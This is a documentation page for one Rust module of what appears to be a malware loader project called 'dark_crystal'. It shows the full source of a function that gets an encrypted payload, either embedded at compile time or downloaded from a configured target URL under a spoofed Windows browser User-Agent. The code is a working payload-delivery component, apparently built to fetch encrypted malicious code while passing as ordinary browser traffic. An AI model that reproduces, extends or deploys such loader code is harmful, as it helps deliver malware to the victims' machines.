# transport

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/transport.rs` |
| **Lines** | 44 |
| **Cards** | T022-architecture |
| **Role** | Payload acquisition (embed vs remote) |
| **Feature gates** | embed_payload, remote_payload |

## Public API

### `get_payload` (line 8)
```rust
pub fn get_payload() -> Result<Vec<u8>>
```
Obtiene el payload cifrado.

Dos modos:
1. `embed_payload`: Carga desde include_bytes! (compilación-time)
2. `remote_payload`: Descarga desde URL (runtime)

## Internal Functions

- `download_payload` (line 28)

## Key Dependencies

- `use anyhow::{anyhow, Context, Result};`

## Full Source

```rust
use anyhow::{anyhow, Context, Result};

/// Obtiene el payload cifrado.
///
/// Dos modos:
/// 1. `embed_payload`: Carga desde include_bytes! (compilación-time)
/// 2. `remote_payload`: Descarga desde URL (runtime)
pub fn get_payload() -> Result<Vec<u8>> {
    #[cfg(feature = "embed_payload")]
    {
        return Ok(crate::selection_config::embedded_payload().to_vec());
    }

    #[cfg(all(feature = "remote_payload", not(feature = "embed_payload")))]
    {
        return download_payload(crate::selection_config::target_url());
    }

    #[cfg(not(any(feature = "embed_payload", feature = "remote_payload")))]
    {
        Err(anyhow!(
            "Sin fuente de payload configurada en selection lock"
        ))
    }
}

#[cfg(all(feature = "remote_payload", not(feature = "embed_payload")))]
fn download_payload(url: &str) -> Result<Vec<u8>> {
    #[cfg(feature = "remote_payload")]
    {
        // Si usamos reqwest (definido en Cargo.toml para remote_payload)
        let client = reqwest::blocking::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .timeout(std::time::Duration::from_secs(30))
            .build()?;

        let resp = client.get(url).send().context("Falla en petición HTTP")?;
        if !resp.status().is_success() {
            return Err(anyhow!("Error HTTP: {}", resp.status()));
        }

        Ok(resp.bytes()?.to_vec())
    }
}

```